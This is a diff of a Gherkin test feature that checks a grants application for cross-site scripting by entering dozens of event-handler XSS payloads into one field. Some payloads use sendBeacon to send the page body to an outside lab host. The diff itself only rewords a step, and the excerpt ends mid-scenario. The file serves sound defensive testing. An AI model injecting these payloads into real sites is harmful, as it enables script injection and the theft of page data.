@@ -8130,7 +8130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                  |
       | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldAssistanceType__c |
@@ -8155,7 +8155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                  |
       | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldAssistanceType__c |
@@ -8180,7 +8180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                  |
       | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldAssistanceType__c |
@@ -8205,7 +8205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                               | Field                  |
       | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
@@ -8230,7 +8230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                  |
       | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldAssistanceType__c |
@@ -8255,7 +8255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                 | Field                  |
       | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
@@ -8280,7 +8280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                              | Field                  |
       | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldAssistanceType__c |
@@ -8305,7 +8305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                          | Field                  |
       | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldAssistanceType__c |
@@ -8330,7 +8330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                  |
       | <body onafterprint=alert(1)> | fieldAssistanceType__c |
@@ -8355,7 +8355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                  |
       | <input onauxclick=alert(1)> | fieldAssistanceType__c |
@@ -8380,7 +8380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
@@ -8405,7 +8405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                  |
       | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
@@ -8430,7 +8430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | <xss contenteditable onbeforeinput=alert(1)>test | fieldAssistanceType__c |
@@ -8455,7 +8455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | <xss contenteditable onbeforeinput=alert(1)>test | fieldAssistanceType__c |
@@ -8480,7 +8480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                    | Field                  |
       | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAssistanceType__c |
@@ -8505,7 +8505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                  |
       | <input onchange=alert(1) value=xss> | fieldAssistanceType__c |
@@ -8530,7 +8530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                  |
       | <xss onclick="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8555,7 +8555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                  |
       | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldAssistanceType__c |
@@ -8580,7 +8580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                  |
       | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8605,7 +8605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAssistanceType__c |
@@ -8630,7 +8630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                  |
       | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | fieldAssistanceType__c |
@@ -8655,7 +8655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                  |
       | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8680,7 +8680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                  |
       | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8705,7 +8705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                  |
       | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8730,7 +8730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                  |
       | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8755,7 +8755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                  |
       | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8780,7 +8780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                           | Field                  |
       | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldAssistanceType__c |
@@ -8805,7 +8805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                  |
       | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8830,7 +8830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                  |
       | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldAssistanceType__c |
@@ -8855,7 +8855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                  |
       | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAssistanceType__c |
@@ -8880,7 +8880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                  |
       | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAssistanceType__c |
@@ -8905,7 +8905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | <input oninput=alert(1) value=xss> | fieldAssistanceType__c |
@@ -8930,7 +8930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                  |
       | <form><input oninvalid=alert(1) required><input type=submit> | fieldAssistanceType__c |
@@ -8955,7 +8955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
@@ -8980,7 +8980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                  |
       | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9005,7 +9005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                  |
       | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9030,7 +9030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                  |
       | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9055,7 +9055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9080,7 +9080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9105,7 +9105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                  |
       | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9130,7 +9130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9155,7 +9155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9180,7 +9180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                  |
       | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldAssistanceType__c |
@@ -9205,7 +9205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                             | Field                  |
       | <xss onmousewheel=alert(1) style=display:block>requires scrolling | fieldAssistanceType__c |
@@ -9230,7 +9230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                  |
       | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAssistanceType__c |
@@ -9255,7 +9255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
@@ -9280,7 +9280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                  |
       | <a onpaste="alert(1)" contenteditable>test</a> | fieldAssistanceType__c |
@@ -9305,7 +9305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                  |
       | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -9330,7 +9330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9355,7 +9355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                  |
       | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9380,7 +9380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                  |
       | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9405,7 +9405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9430,7 +9430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9455,7 +9455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9480,7 +9480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9505,7 +9505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9530,7 +9530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldAssistanceType__c |
@@ -9555,7 +9555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -9580,7 +9580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | <form onreset=alert(1)><input type=reset> | fieldAssistanceType__c |
@@ -9605,7 +9605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldAssistanceType__c |
@@ -9630,7 +9630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                  |
       | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -9655,7 +9655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                              | Field                  |
       | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -9680,7 +9680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                  |
       | <input onselect=alert(1) value="XSS" autofocus> | fieldAssistanceType__c |
@@ -9705,7 +9705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | <body onselectionchange=alert(1)>select some text | fieldAssistanceType__c |
@@ -9730,7 +9730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | <body onselectstart=alert(1)>select some text | fieldAssistanceType__c |
@@ -9755,7 +9755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                      | Field                  |
       | <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div> | fieldAssistanceType__c |
@@ -9780,7 +9780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                       | Field                  |
